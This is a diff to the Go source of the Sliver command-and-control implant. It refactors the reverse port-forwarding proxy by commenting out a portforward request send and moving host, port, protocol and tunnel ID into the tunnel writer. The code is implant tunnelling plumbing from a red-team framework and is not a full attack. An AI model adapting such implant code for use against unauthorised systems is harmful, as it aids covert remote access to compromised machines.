@@ -32,7 +32,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/golang/protobuf/proto"
 )
 
 var (
@@ -155,15 +154,15 @@ func (p *ChannelProxy) HandleConn(src net.Conn) {
 	)
 	p.Conn.AddTunnel(tunnel)
 	// Create a reverse tunnel, then start it before binding the shell to the newly created tunnel
-	log.Printf("[tcpproxy] Binding tunnel to portfwd %d", p.Port())
+	// log.Printf("[tcpproxy] Binding tunnel to portfwd %d", p.Port())
 
-	req := &sliverpb.RPortfwdReq{
-		Host:     p.Host(),
-		Port:     p.Port(),
-		Protocol: sliverpb.PortFwdProtoTCP,
-		TunnelID: tId}
-	data, _ := proto.Marshal(req)
-	p.Conn.Send <- &sliverpb.Envelope{ID: EnvelopeID(), Type: sliverpb.MsgPortfwdReq, Data: data}
+	// req := &sliverpb.RPortfwdReq{
+	// 	Host:     p.Host(),
+	// 	Port:     p.Port(),
+	// 	Protocol: sliverpb.PortFwdProtoTCP,
+	// 	TunnelID: tId}
+	// data, _ := proto.Marshal(req)
+	// p.Conn.Send <- &sliverpb.Envelope{ID: EnvelopeID(), Type: sliverpb.MsgPortfwdReq, Data: data}
 
 	cleanup := func(reason error) {
 		// {{if .Config.Debug}}
@@ -171,11 +170,11 @@ func (p *ChannelProxy) HandleConn(src net.Conn) {
 		// {{end}}
 		tunnel := p.Conn.Tunnel(tunnel.ID)
 
-		// tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
-		// 	Closed:   true,
-		// 	TunnelID: tunnel.ID,
-		// })
-		// p.Conn.Send <- &sliverpb.Envelope{
+		//tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+		//Closed:   true,
+		//	TunnelID: tunnel.ID,
+		//})
+		//p.Conn.Send <- &sliverpb.Envelope{
 		// 	Type: sliverpb.MsgTunnelClose,
 		// 	Data: tunnelClose,
 		// }
@@ -186,8 +185,12 @@ func (p *ChannelProxy) HandleConn(src net.Conn) {
 
 	go func() {
 		tWriter := tunnelWriter{
-			tun:  tunnel,
-			conn: p.Conn,
+			tun:      tunnel,
+			conn:     p.Conn,
+			host:     p.Host(),
+			port:     p.Port(),
+			protocol: sliverpb.PortFwdProtoTCP,
+			tunnelID: tId,
 		}
 		// portfwd only uses one reader, hence the tunnel.Readers[0]
 		n, err := io.Copy(tWriter, tunnel.Readers[0])
